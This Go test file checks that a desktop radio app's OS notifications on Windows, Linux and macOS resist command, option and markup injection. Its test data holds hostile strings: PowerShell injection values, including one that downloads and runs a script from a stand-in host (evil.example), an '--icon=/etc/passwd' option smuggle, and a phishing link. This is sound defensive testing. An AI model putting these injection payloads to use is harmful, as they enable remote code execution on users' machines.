package desktop

import (
	"context"
	"encoding/base64"
	"encoding/binary"
	"regexp"
	"strings"
	"testing"
	"unicode/utf16"
)

// decodePowerShellArgs checks the Windows argv shape and returns the decoded
// script text carried by -EncodedCommand.
func decodePowerShellArgs(t *testing.T, args []string) string {
	t.Helper()
	if len(args) != 4 || args[0] != "-NoProfile" || args[1] != "-NonInteractive" || args[2] != "-EncodedCommand" {
		t.Fatalf("unexpected powershell argv: %v", args)
	}
	raw, err := base64.StdEncoding.DecodeString(args[3])
	if err != nil {
		t.Fatalf("EncodedCommand is not base64: %v", err)
	}
	if len(raw)%2 != 0 {
		t.Fatalf("EncodedCommand is not UTF-16LE (odd length %d)", len(raw))
	}
	u := make([]uint16, len(raw)/2)
	for i := range u {
		u[i] = binary.LittleEndian.Uint16(raw[2*i:])
	}
	return string(utf16.Decode(u))
}

var psB64Literal = regexp.MustCompile(`FromBase64String\('([A-Za-z0-9+/=]*)'\)`)

func TestWindowsNotification_HostileTextIsNeverScript(t *testing.T) {
	hostile := []string{
		"x;Start-Process calc;#",
		"Don't Stop'; calc; '",
		"Jazz FM $(Start-Process calc)",
		"back`tick`; calc",
		"line1\nStart-Process calc\r\nline3",
		"quote’; calc; ‘",
		`dq"; iwr http://evil.example/x.ps1|iex; "`,
		"{ & calc } | Out-Null",
	}
	needles := []string{"calc", "Start-Process", "iwr", "$(", "`", "’", "‘", "Out-Null", "evil.example"}

	for _, h := range hostile {
		t.Run(h, func(t *testing.T) {
			var gotName string
			var gotArgs []string
			runner := func(_ context.Context, name string, args ...string) error {
				gotName, gotArgs = name, args
				return nil
			}
			dispatchOSNotification(runner, "windows", "📻 halpradio — "+h, "🎶 "+h)

			if gotName != "powershell" {
				t.Fatalf("expected powershell, got %q", gotName)
			}
			// 1. No argv element carries attacker text in clear.
			for i, a := range gotArgs {
				for _, n := range needles {
					if strings.Contains(a, n) {
						t.Fatalf("argv[%d] contains attacker text %q: %q", i, n, a)
					}
				}
			}
			// 2. Inside the decoded script, attacker text exists only in the
			//    base64 literals; outside them the script is constant.
			script := decodePowerShellArgs(t, gotArgs)
			lits := psB64Literal.FindAllStringSubmatch(script, -1)
			if len(lits) != 2 {
				t.Fatalf("expected 2 base64 literals, got %d in %q", len(lits), script)
			}
			outside := psB64Literal.ReplaceAllString(script, "FromBase64String('')")
			if outside != PowerShellToastScript("", "") {
				t.Fatalf("script outside the base64 payload differs from the constant template:\n%s", outside)
			}
			// 3. The payload round-trips to the sanitized text.
			wantTitle := sanitizeNotificationString("📻 halpradio — "+h, 256)
			wantMsg := sanitizeNotificationString("🎶 "+h, 1024)
			for i, want := range []string{wantTitle, wantMsg} {
				dec, err := base64.StdEncoding.DecodeString(lits[i][1])
				if err != nil {
					t.Fatalf("literal %d: %v", i, err)
				}
				if string(dec) != want {
					t.Errorf("literal %d = %q, want %q", i, dec, want)
				}
			}
		})
	}
}

func TestLinuxNotification_BodyMarkupEscapedAndOptionsTerminated(t *testing.T) {
	var gotArgs []string
	runner := func(_ context.Context, _ string, args ...string) error {
		gotArgs = args
		return nil
	}
	dispatchOSNotification(runner, "linux", "--icon=/etc/passwd", `<a href="https://evil.example/login">Update & sign in</a>`)

	n := len(gotArgs)
	if n < 3 || gotArgs[n-3] != "--" {
		t.Fatalf("expected -- before title, got %v", gotArgs)
	}
	if gotArgs[n-2] != "--icon=/etc/passwd" {
		t.Errorf("title changed: %q", gotArgs[n-2])
	}
	want := `&lt;a href="https://evil.example/login"&gt;Update &amp; sign in&lt;/a&gt;`
	if gotArgs[n-1] != want {
		t.Errorf("body = %q, want %q", gotArgs[n-1], want)
	}
}

func TestSanitizeNotificationString_DropsC1BidiZeroWidth(t *testing.T) {
	in := "a\u009b31mb‮​c\x1b]0;x\x07d"
	got := sanitizeNotificationString(in, 256)
	for _, r := range got {
		if r == 0x9b || r == 0x202e || r == 0x200b || r == 0x1b || r == 0x07 {
			t.Fatalf("unsafe rune %U survived: %q", r, got)
		}
	}
	// Truncation is by runes, never splitting a multi-byte rune.
	got = sanitizeNotificationString(strings.Repeat("é", 10), 3)
	if got != "ééé" {
		t.Errorf("rune truncation = %q", got)
	}
}

// RR-E-5: osascript keeps parsing options until "--", so a title such as
// "-e" would otherwise be compiled as script and "-i" would switch mode.
func TestDarwinNotification_OptionLikeTextIsArgvData(t *testing.T) {
	for _, title := range []string{"-e", "-i", "-l", "--", "-s"} {
		name, args, ok := NotificationCommand("darwin", title, "-e")
		if !ok || name != "osascript" {
			t.Fatalf("unexpected command %q ok=%v", name, ok)
		}
		n := len(args)
		if n < 3 || args[n-3] != "--" || args[n-2] != title || args[n-1] != "-e" {
			t.Fatalf("title %q: argv must end with -- title message, got %q", title, args)
		}
		for i, a := range args[:n-3] {
			if i%2 == 0 && a != "-e" {
				t.Fatalf("title %q: only -e script options may precede --: %q", title, args)
			}
		}
	}
}
